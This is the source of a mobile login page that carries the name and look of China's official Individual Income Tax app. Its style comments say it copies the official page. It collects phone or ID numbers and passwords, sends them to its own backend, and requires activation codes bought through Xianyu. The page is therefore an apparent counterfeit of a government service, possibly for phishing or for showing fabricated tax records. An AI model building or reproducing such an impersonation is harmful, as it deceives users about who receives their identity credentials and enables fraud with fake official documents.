<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <script src="/js/auth.js?v=20260720-nav-speed"></script>
    <script src="/js/browser-install-prompt.js?v=20260717-download" defer></script>
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>个人所得税</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'PingFang SC', 'Hiragino Sans GB', 'Microsoft YaHei', sans-serif;
            background-color: #fff;
            min-height: 100vh;
        }
        
        /* 顶部导航（与官方登录页一致） */
        .header {
            background: #fff;
            padding: 12px 16px;
            min-height: 44px;
            display: flex;
            align-items: center;
            justify-content: center;
            position: relative;
            border-bottom: 1px solid #f5f5f5;
        }

        .back-btn {
            position: absolute;
            left: 12px;
            color: #4285f4;
            font-size: 17px;
            text-decoration: none;
            display: inline-flex;
            align-items: center;
            gap: 0;
            line-height: 1;
            -webkit-tap-highlight-color: transparent;
            outline: none;
        }

        .back-btn .back-chevron {
            font-size: 22px;
            font-weight: 300;
            margin-right: 1px;
            transform: translateY(-1px);
        }

        .header-title {
            font-size: 17px;
            font-weight: 600;
            color: #333;
            letter-spacing: 0.02em;
        }

        /* 头像区域 */
        .avatar-section {
            display: flex;
            justify-content: center;
            padding: 44px 0 36px;
        }

        .avatar {
            width: 96px;
            height: 96px;
            border-radius: 50%;
            overflow: hidden;
            background: #e8f2ff;
            flex-shrink: 0;
        }

        .avatar-img {
            display: block;
            width: 100%;
            height: 100%;
            object-fit: cover;
        }
        
        /* 表单区域 */
        .form-section {
            padding: 0 20px;
        }

        .form-item {
            display: flex;
            align-items: center;
            min-height: 52px;
            padding: 14px 0;
            border-bottom: 1px solid #f0f0f0;
        }

        .form-label {
            width: 48px;
            font-size: 16px;
            color: #333;
            flex-shrink: 0;
        }

        .form-input {
            flex: 1;
            min-width: 0;
            border: none;
            outline: none;
            font-size: 16px;
            color: #333;
            padding: 0 8px;
            background: transparent;
        }

        .form-input::placeholder {
            color: #ccc;
        }

        .form-help {
            width: 20px;
            height: 20px;
            border-radius: 50%;
            border: none;
            background: #a8ccf5;
            color: #fff;
            font-size: 13px;
            font-weight: 600;
            line-height: 20px;
            text-align: center;
            flex-shrink: 0;
            cursor: pointer;
            -webkit-tap-highlight-color: transparent;
        }

        /* 滑块验证（对齐官方：灰底白块 >>，通过后整条绿底白字） */
        .slider-section {
            padding: 12px 20px 0;
        }
        .slider-lane {
            position: relative;
            height: 40px;
            background: #f0f0f0;
            border-radius: 3px;
            overflow: hidden;
        }
        .slider-lane.is-verified {
            background: #94c843;
        }
        .slider-hint {
            position: absolute;
            inset: 0;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 6px;
            padding: 0 12px;
            font-size: 14px;
            color: #bdbdbd;
            pointer-events: none;
            user-select: none;
            z-index: 1;
        }
        .slider-hint-text {
            line-height: 1.2;
        }
        .slider-hint-check {
            display: none;
            width: 18px;
            height: 18px;
            border-radius: 50%;
            background: #fff;
            align-items: center;
            justify-content: center;
            flex-shrink: 0;
        }
        .slider-hint-check svg {
            display: block;
            width: 11px;
            height: 11px;
            color: #7eb63a;
        }
        .slider-lane.is-verified .slider-hint {
            color: #fff;
            font-size: 15px;
        }
        .slider-lane.is-verified .slider-hint-check {
            display: inline-flex;
        }
        .slider-arrows {
            position: absolute;
            left: 2px;
            top: 2px;
            width: 46px;
            height: calc(100% - 4px);
            background: #fff;
            border-radius: 2px;
            box-shadow: 0 1px 4px rgba(0, 0, 0, 0.14);
            display: flex;
            align-items: center;
            justify-content: center;
            z-index: 2;
            cursor: grab;
            touch-action: none;
            -webkit-tap-highlight-color: transparent;
        }
        .slider-arrows:active {
            cursor: grabbing;
        }
        .slider-grip-icon {
            display: block;
            width: 16px;
            height: 16px;
            color: #a8a8a8;
        }
        .slider-lane.is-verified .slider-arrows {
            display: none;
        }

        .login-aux {
            display: flex;
            justify-content: flex-end;
            align-items: center;
            gap: 6px;
            padding: 14px 20px 0;
            font-size: 15px;
        }
        .login-aux a {
            color: #4285f4;
            text-decoration: none;
            -webkit-tap-highlight-color: transparent;
        }
        .login-aux-sep {
            color: #4285f4;
            user-select: none;
        }

        /* 按钮区域 */
        .btn-section {
            padding: 28px 20px 24px;
        }

        .login-btn {
            width: 100%;
            height: 48px;
            background: #4285f4;
            border: none;
            border-radius: 24px;
            font-size: 17px;
            font-weight: 400;
            color: #fff;
            cursor: pointer;
            margin-bottom: 14px;
            -webkit-tap-highlight-color: transparent;
        }
        .login-btn:disabled,
        .login-btn.login-btn--locked {
            background: #d2e7fc;
            color: #fff;
            cursor: pointer;
        }
        .login-form-tip {
            display: none;
            margin: 10px 24px 0;
            padding: 10px 12px;
            font-size: 14px;
            line-height: 1.5;
            color: #d46b08;
            background: #fff7e6;
            border: 1px solid #ffd591;
            border-radius: 8px;
            text-align: center;
        }
        .login-form-tip.show {
            display: block;
        }
        .slider-lane.slider-warn {
            animation: loginSliderShake 0.45s ease;
            box-shadow: inset 0 0 0 1px #ffa940;
        }
        @keyframes loginSliderShake {
            0%, 100% { transform: translateX(0); }
            25% { transform: translateX(-4px); }
            75% { transform: translateX(4px); }
        }
        
        .register-btn {
            display: flex;
            align-items: center;
            justify-content: center;
            width: 100%;
            height: 48px;
            background: #fff;
            border: 1px solid #4285f4;
            border-radius: 24px;
            font-size: 17px;
            color: #4285f4;
            cursor: pointer;
            text-decoration: none;
            -webkit-tap-highlight-color: transparent;
            box-sizing: border-box;
        }

        #activateSection {
            display: none;
            padding: 0 24px 32px;
        }
        #activateSection.activate-visible {
            display: block;
        }
        .activate-hint {
            font-size: 14px;
            color: #666;
            line-height: 1.5;
            margin-bottom: 16px;
            text-align: center;
        }
        .activate-code-input {
            width: 100%;
            height: 48px;
            border: 1px solid #e0e0e0;
            border-radius: 12px;
            padding: 0 14px;
            font-size: 16px;
            letter-spacing: 0.04em;
            box-sizing: border-box;
            margin-bottom: 12px;
        }
        .activate-code-input:focus {
            outline: none;
            border-color: #1e6fff;
        }
        .activate-btn {
            width: 100%;
            height: 48px;
            background: #1e6fff;
            border: none;
            border-radius: 24px;
            font-size: 17px;
            color: #fff;
            cursor: pointer;
            margin-bottom: 12px;
        }
        .activate-btn:disabled {
            opacity: 0.6;
        }
        .activate-btn-secondary {
            background: #fff;
            color: #1e6fff;
            border: 1px solid #d0d8e8;
        }
        .activate-btn-row {
            display: flex;
            gap: 10px;
            margin-bottom: 12px;
        }
        .activate-btn-row .activate-btn {
            flex: 1;
            margin-bottom: 0;
        }
        .activate-msg {
            font-size: 13px;
            min-height: 1.2em;
            margin-bottom: 8px;
            text-align: center;
        }
        .activate-msg.err {
            color: #e53935;
        }
        .activate-msg.ok {
            color: #2e7d32;
        }

        .login-welcome-modal {
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            width: 100%;
            height: 100%;
            z-index: 10000;
            display: none;
            overflow: hidden;
        }
        .login-welcome-modal.is-open {
            display: block;
        }
        .login-welcome-modal-mask {
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.45);
        }
        .login-welcome-modal-panel {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            -webkit-transform: translate(-50%, -50%);
            z-index: 1;
            width: calc(100% - 48px);
            max-width: 320px;
            background: #fff;
            border-radius: 12px;
            padding: 22px 20px 18px;
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.12);
        }
        .login-welcome-modal-title {
            font-size: 17px;
            font-weight: 600;
            color: #333;
            text-align: center;
            margin-bottom: 14px;
        }
        .login-welcome-modal-body {
            font-size: 15px;
            line-height: 1.65;
            color: #444;
            text-align: center;
        }
        .login-welcome-modal-btn {
            display: block;
            width: 100%;
            margin-top: 20px;
            height: 44px;
            border: none;
            border-radius: 8px;
            background: #1e6fff;
            color: #fff;
            font-size: 16px;
        }

        .login-error-modal-actions {
            display: flex;
            align-items: center;
            justify-content: space-between;
            gap: 12px;
            margin-top: 20px;
        }

        .login-error-recover-link {
            flex: 1;
            min-width: 0;
            font-size: 14px;
            line-height: 1.4;
            color: #1e6fff;
            text-decoration: none;
            text-align: left;
            -webkit-tap-highlight-color: transparent;
        }

        .login-error-recover-link:active {
            opacity: 0.75;
        }

        .login-error-modal-actions .login-welcome-modal-btn {
            flex: 0 0 auto;
            width: auto;
            min-width: 88px;
            margin-top: 0;
            padding: 0 18px;
        }
    </style>
</head>
<body class="page-login">
    <script>
        (function () {
            try {
                if (navigator.userAgent.indexOf('MicroMessenger') !== -1) {
                    alert('⚠️ 微信内无法下载，请点右上角「…」→「在浏览器中打开」');
                }
            } catch (e) {}
        })();
    </script>
    <!-- 顶部导航 -->
    <div class="header">
        <a href="javascript:history.back()" class="back-btn" aria-label="返回">
            <span class="back-chevron" aria-hidden="true">&lt;</span><span>返回</span>
        </a>
        <span class="header-title">个人所得税</span>
    </div>
    
    <div id="loginMainWrap">
        <!-- 头像区域 -->
        <div class="avatar-section">
            <div class="avatar">
                <img class="avatar-img" src="login_avatar.png" width="96" height="96" alt="" decoding="async">
            </div>
        </div>

        <!-- 表单区域 -->
        <div class="form-section">
            <div class="form-item">
                <span class="form-label">账号</span>
                <input type="text" id="loginUsername" class="form-input" placeholder="手机号码/证件号码" autocomplete="username" value="">
                <span class="form-help" id="loginAccountHelp" role="button" tabindex="0" aria-label="账号说明">?</span>
            </div>
            <div class="form-item">
                <span class="form-label">密码</span>
                <input type="password" id="loginPassword" class="form-input" placeholder="请输入密码" autocomplete="current-password" value="">
            </div>
        </div>

        <div class="slider-section">
            <div class="slider-lane" id="loginSliderLane">
                <span class="slider-hint" id="loginSliderHint">
                    <span class="slider-hint-check" id="loginSliderCheck" aria-hidden="true">
                        <svg viewBox="0 0 12 12" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
                            <path d="M2.5 6.2l2.2 2.2 4.8-5.2" fill="none" stroke="currentColor" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round"/>
                        </svg>
                    </span>
                    <span class="slider-hint-text" id="loginSliderHintText">请按住滑块，拖动到最右边</span>
                </span>
                <div class="slider-arrows" id="loginSliderHandle" aria-label="拖动滑块完成验证">
                    <svg class="slider-grip-icon" viewBox="0 0 16 16" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
                        <path d="M5 3.5l3.5 4.5-3.5 4.5" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/>
                        <path d="M9.5 3.5l3.5 4.5-3.5 4.5" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/>
                    </svg>
                </div>
            </div>
        </div>
        <p class="login-form-tip" id="loginFormTip" role="alert" aria-live="polite"></p>
        <div class="login-aux">
            <a href="javascript:void(0)" id="linkFaceLogin">扫脸登录</a>
            <span class="login-aux-sep">|</span>
            <a href="zhzh_jhm.html" id="linkForgotPwd">找回密码</a>
        </div>

        <!-- 按钮区域 -->
        <div class="btn-section">
            <button type="button" class="login-btn login-btn--locked" id="loginSubmitBtn" onclick="doLogin()">登录</button>
            <a href="register.html" class="register-btn">注册</a>
        </div>
    </div>

    <div id="activateSection">
        <p class="activate-hint">您的账号尚未激活，请输入管理员提供的激活码。新用户注册时填写激活码即可直接开通，无需此步骤。</p>
        <p class="activate-msg" id="activateMsg"></p>
        <input type="text" id="activateCodeInput" class="activate-code-input" placeholder="粘贴或输入激活码" autocomplete="off" autocapitalize="characters">
        <div class="activate-btn-row">
            <button type="button" class="activate-btn activate-btn-secondary" id="btnXianyuPurchase">闲鱼购买</button>
            <button type="button" class="activate-btn" id="btnDoActivate">立即激活</button>
        </div>
        <button type="button" class="activate-btn activate-btn-secondary" id="btnActivateLogout">退出并换账号</button>
    </div>

    <div id="loginErrorModal" class="login-welcome-modal" role="alertdialog" aria-modal="true" aria-labelledby="loginErrorModalBody">
        <div class="login-welcome-modal-mask" id="loginErrorModalMask"></div>
        <div class="login-welcome-modal-panel">
            <p class="login-welcome-modal-body" id="loginErrorModalBody" style="margin-bottom:0;">账号或密码错误</p>
            <div class="login-error-modal-actions">
                <a href="zhzh_jhm.html" class="login-error-recover-link" id="loginErrorRecoverLink">找回账号密码（激活码）</a>
                <button type="button" class="login-welcome-modal-btn" id="loginErrorModalOk">确定</button>
            </div>
        </div>
    </div>

    <script src="/js/tutorial-video-prompt.js?v=20260705-huawei-modal-fix"></script>
    <script src="/js/toast-duration.js?v=20260529-toast-3s"></script>
    <script src="/js/xianyu-copy.js?v=20260529-toast-3s"></script>
    <script>
        function isNeedActivateMode() {
            try {
                return new URLSearchParams(window.location.search).get('need_activate') === '1';
            } catch (e) {
                return false;
            }
        }

        function setActivateMsg(text, isErr) {
            var el = document.getElementById('activateMsg');
            if (!el) {
                return;
            }
            el.textContent = text || '';
            el.className = 'activate-msg' + (text ? (isErr ? ' err' : ' ok') : '');
        }

        function showActivateMode() {
            var main = document.getElementById('loginMainWrap');
            var act = document.getElementById('activateSection');
            if (main) {
                main.style.display = 'none';
            }
            if (act) {
                act.classList.add('activate-visible');
            }
            try {
                document.querySelector('.header-title').textContent = '账号激活';
            } catch (e0) {}
        }

        function initActivateFromUrl() {
            if (!isNeedActivateMode()) {
                return;
            }
            var token = '';
            try {
                token = localStorage.getItem('token') || '';
            } catch (e1) {}
            if (!token) {
                return;
            }
            try {
                if (localStorage.getItem('account_active') === '1') {
                    window.location.replace('mine.html');
                    return;
                }
            } catch (e2) {}
            showActivateMode();
            prefetchXianyuPurchaseUrl();
        }

        initActivateFromUrl();

        function prefetchXianyuPurchaseUrl() {
            var url =
                typeof getPublicInstallPackagesUrl === 'function'
                    ? getPublicInstallPackagesUrl()
                    : '/api/public/install-packages';
            fetch(url, { credentials: 'same-origin' })
                .then(function (r) {
                    return r.json();
                })
                .then(function (body) {
                    var data = body && body.code === 200 && body.data ? body.data : null;
                    window.__xianyuPurchaseUrl =
                        data && data.xianyu_purchase_url ? String(data.xianyu_purchase_url).trim() : '';
                    if (typeof applyXianyuPurchaseVisibility === 'function') {
                        applyXianyuPurchaseVisibility(data);
                    }
                })
                .catch(function () {
                    window.__xianyuPurchaseUrl = '';
                    if (typeof applyXianyuPurchaseVisibility === 'function') {
                        applyXianyuPurchaseVisibility(null);
                    }
                });
        }
        prefetchXianyuPurchaseUrl();

        document.getElementById('btnXianyuPurchase').addEventListener('click', function () {
            function doCopy(txt) {
                if (!txt) {
                    setActivateMsg('暂未配置购买文案，请在管理后台「引导安装」中填写', true);
                    return;
                }
                if (typeof copyXianyuPurchaseText !== 'function') {
                    setActivateMsg('复制功能不可用', true);
                    return;
                }
                copyXianyuPurchaseText(txt).catch(function () {
                    setActivateMsg('复制失败，请长按手动复制', true);
                });
            }
            var cached = String(window.__xianyuPurchaseUrl || '').trim();
            if (cached) {
                doCopy(cached);
                return;
            }
            var pkgUrl =
                typeof getPublicInstallPackagesUrl === 'function'
                    ? getPublicInstallPackagesUrl()
                    : '/api/public/install-packages';
            fetch(pkgUrl, { credentials: 'same-origin' })
                .then(function (r) {
                    return r.json();
                })
                .then(function (body) {
                    var t =
                        body && body.code === 200 && body.data && body.data.xianyu_purchase_url
                            ? String(body.data.xianyu_purchase_url).trim()
                            : '';
                    window.__xianyuPurchaseUrl = t;
                    doCopy(t);
                })
                .catch(function () {
                    setActivateMsg('网络错误', true);
                });
        });

        document.getElementById('btnDoActivate').addEventListener('click', function () {
            var code = document.getElementById('activateCodeInput').value.trim();
            if (!code) {
                setActivateMsg('请输入激活码', true);
                return;
            }
            var btn = document.getElementById('btnDoActivate');
            btn.disabled = true;
            setActivateMsg('');
            fetch('api/auth.php', {
                method: 'POST',
                headers: typeof authHeaders === 'function' ? authHeaders() : { 'Content-Type': 'application/json' },
                body: JSON.stringify({ action: 'activate', code: code })
            })
                .then(function (r) {
                    return r.json().then(function (j) {
                        return { status: r.status, body: j };
                    });
                })
                .then(function (x) {
                    if (x.status === 200 && x.body.code === 200 && x.body.data) {
                        var d = x.body.data;
                        if (d.token) {
                            localStorage.setItem('token', d.token);
                        }
                        localStorage.setItem('account_active', '1');
                        localStorage.setItem('is_test_account', d.is_test_account ? '1' : '0');
                        if (d.user_id) {
                            localStorage.setItem('user_id', d.user_id);
                        }
                        if (d.real_name) {
                            localStorage.setItem('real_name', d.real_name);
                        }
                        setActivateMsg('激活成功，正在进入…', false);
                        setTimeout(function () {
                            window.location.href = 'mine.html';
                        }, 400);
                        return;
                    }
                    setActivateMsg((x.body && x.body.msg) || '激活失败', true);
                })
                .catch(function () {
                    setActivateMsg('网络错误', true);
                })
                .finally(function () {
                    btn.disabled = false;
                });
        });

        document.getElementById('btnActivateLogout').addEventListener('click', function () {
            if (typeof authClearSession === 'function') {
                authClearSession();
            } else {
                try {
                    localStorage.removeItem('token');
                    localStorage.removeItem('account_active');
                } catch (e3) {}
            }
            window.location.href = 'index.html';
        });

        function isLoginSliderVerified() {
            var lane = document.getElementById('loginSliderLane');
            return !!(lane && lane.classList.contains('is-verified'));
        }

        function showLoginFormTip(msg) {
            var tip = document.getElementById('loginFormTip');
            if (!tip) {
                if (msg) alert(msg);
                return;
            }
            if (!msg) {
                tip.textContent = '';
                tip.classList.remove('show');
                return;
            }
            tip.textContent = msg;
            tip.classList.add('show');
        }

        function warnLoginSlider() {
            var lane = document.getElementById('loginSliderLane');
            if (!lane) return;
            lane.classList.remove('slider-warn');
            void lane.offsetWidth;
            lane.classList.add('slider-warn');
            window.setTimeout(function () {
                lane.classList.remove('slider-warn');
            }, 500);
        }

        function setLoginSubmitReady(ready) {
            var loginBtn = document.getElementById('loginSubmitBtn');
            if (!loginBtn) return;
            if (ready) {
                loginBtn.classList.remove('login-btn--locked');
            } else {
                loginBtn.classList.add('login-btn--locked');
            }
        }

        function initLoginSlider() {
            var lane = document.getElementById('loginSliderLane');
            var handle = document.getElementById('loginSliderHandle');
            var hintText = document.getElementById('loginSliderHintText');
            var loginBtn = document.getElementById('loginSubmitBtn');
            if (!lane || !handle || !hintText || !loginBtn) return;

            var HANDLE_INSET = 2;
            var maxX = 0;
            var startLeft = 0;
            var startClientX = 0;
            var dragging = false;

            function layout() {
                maxX = Math.max(0, lane.offsetWidth - handle.offsetWidth - HANDLE_INSET * 2);
            }
            function setHandle(x) {
                x = Math.max(0, Math.min(x, maxX));
                handle.style.left = HANDLE_INSET + x + 'px';
            }
            function resetSlider() {
                lane.classList.remove('is-verified');
                handle.style.left = HANDLE_INSET + 'px';
                hintText.textContent = '请按住滑块，拖动到最右边';
                setLoginSubmitReady(false);
            }
            function onPointerDown(e) {
                if (lane.classList.contains('is-verified')) return;
                dragging = true;
                layout();
                startLeft = handle.offsetLeft - HANDLE_INSET;
                startClientX = e.clientX != null ? e.clientX : e.touches[0].clientX;
                e.preventDefault();
            }
            function onPointerMove(e) {
                if (!dragging) return;
                var cx = e.clientX != null ? e.clientX : (e.touches && e.touches[0] ? e.touches[0].clientX : 0);
                setHandle(startLeft + cx - startClientX);
                e.preventDefault();
            }
            function onPointerUp() {
                if (!dragging) return;
                dragging = false;
                layout();
                if (handle.offsetLeft - HANDLE_INSET >= maxX - 2) {
                    lane.classList.add('is-verified');
                    handle.style.left = HANDLE_INSET + 'px';
                    hintText.textContent = '验证通过！';
                    setLoginSubmitReady(true);
                    showLoginFormTip('');
                } else {
                    resetSlider();
                }
            }

            handle.addEventListener('mousedown', onPointerDown);
            handle.addEventListener('touchstart', onPointerDown, { passive: false });
            document.addEventListener('mousemove', onPointerMove);
            document.addEventListener('touchmove', onPointerMove, { passive: false });
            document.addEventListener('mouseup', onPointerUp);
            document.addEventListener('touchend', onPointerUp);
            document.addEventListener('touchcancel', onPointerUp);
            window.addEventListener('resize', function () {
                if (!lane.classList.contains('is-verified')) {
                    layout();
                    setHandle(handle.offsetLeft - HANDLE_INSET);
                }
            });
            layout();
            resetSlider();
        }
        initLoginSlider();

        var loginAccountHelp = document.getElementById('loginAccountHelp');
        if (loginAccountHelp) {
            loginAccountHelp.addEventListener('click', function () {
                alert('可使用手机号码或居民身份证号码作为账号登录。');
            });
        }
        var linkFaceLogin = document.getElementById('linkFaceLogin');
        if (linkFaceLogin) {
            linkFaceLogin.addEventListener('click', function () {
                alert('扫脸登录功能暂未开放，请使用账号密码登录。');
            });
        }
        function showLoginErrorModal(msg) {
            var text = String(msg || '登录失败');
            var isWrongPassword = text.indexOf('密码错误') >= 0;
            if (!isWrongPassword) {
                alert(text);
                return;
            }
            var root = document.getElementById('loginErrorModal');
            var body = document.getElementById('loginErrorModalBody');
            if (!root || !body) {
                alert(text);
                return;
            }
            body.textContent = '密码错误。如忘记密码，请通过激活码找回账号与密码。';
            root.classList.add('is-open');
        }

        function closeLoginErrorModal() {
            var root = document.getElementById('loginErrorModal');
            if (root) root.classList.remove('is-open');
        }

        (function bindLoginErrorModal() {
            var ok = document.getElementById('loginErrorModalOk');
            var mask = document.getElementById('loginErrorModalMask');
            if (ok) ok.addEventListener('click', closeLoginErrorModal);
            if (mask) mask.addEventListener('click', closeLoginErrorModal);
        })();

        function doLogin() {
            var username = document.getElementById('loginUsername').value.trim();
            var password = document.getElementById('loginPassword').value;
            showLoginFormTip('');

            if (!username) {
                showLoginFormTip('请输入账号');
                return;
            }
            if (!password) {
                showLoginFormTip('请输入密码');
                return;
            }
            if (!isLoginSliderVerified()) {
                showLoginFormTip('请先按住滑块，拖动到最右边完成验证');
                warnLoginSlider();
                return;
            }

            var loginClientId = '';
            var loginGuestUsername = '';
            try {
                if (typeof window.getOrCreateClientDeviceId === 'function') {
                    loginClientId = String(window.getOrCreateClientDeviceId() || '');
                } else if (typeof window.buildClientDevicePayload === 'function') {
                    var _loginDev = window.buildClientDevicePayload();
                    if (_loginDev && _loginDev.client_id) loginClientId = String(_loginDev.client_id);
                }
            } catch (eLoginCid) {}
            try {
                var lgU = localStorage.getItem('guest_username_v1') || '';
                if (lgU && lgU.indexOf('__guest_') === 0) loginGuestUsername = lgU;
            } catch (eLg) {}
            fetch('api/auth.php', {
                method: 'POST',
                headers: typeof authHeaders === 'function' ? authHeaders() : { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    action: 'login',
                    username: username,
                    password: password,
                    client_id: loginClientId || undefined,
                    guest_username: loginGuestUsername || undefined
                })
            })
                .then(function (r) { return r.json(); })
                .then(function (data) {
                    if (data.code === 200 && data.data) {
                        var d = data.data;
                        if (d.token) {
                            localStorage.setItem('token', d.token);
                        }
                        localStorage.removeItem('landing_guest_v1');
                        try {
                            localStorage.removeItem('guest_username_v1');
                            localStorage.removeItem('guest_sample_tax_seeded_v1');
                        } catch (eClrLg) {}
                        localStorage.setItem('userName', d.username || username);
                        localStorage.setItem('user_id', d.user_id || username);
                        localStorage.setItem('real_name', d.real_name || username);
                        if (d.guest_data_migrated) {
                            try {
                                sessionStorage.setItem(
                                    'guest_data_migrated_notice',
                                    JSON.stringify({
                                        msg: '您在游客模式下填写的资料已同步到当前账号'
                                    })
                                );
                            } catch (eMigN) {}
                        }
                        var act = d.account_active === true || d.account_active === 1;
                        localStorage.setItem('account_active', act ? '1' : '0');
                        localStorage.setItem('is_test_account', d.is_test_account ? '1' : '0');
                        if (
                            !act &&
                            window.TutorialVideoPrompt &&
                            typeof window.TutorialVideoPrompt.markPostLoginPending === 'function'
                        ) {
                            window.TutorialVideoPrompt.markPostLoginPending();
                        }
                        window.location.href = 'mine.html';
                        return;
                    }
                    showLoginErrorModal(data.msg || '登录失败');
                })
                .catch(function () {
                    alert('网络错误，请检查服务是否可用');
                });
        }

    </script>
</body>
</html>
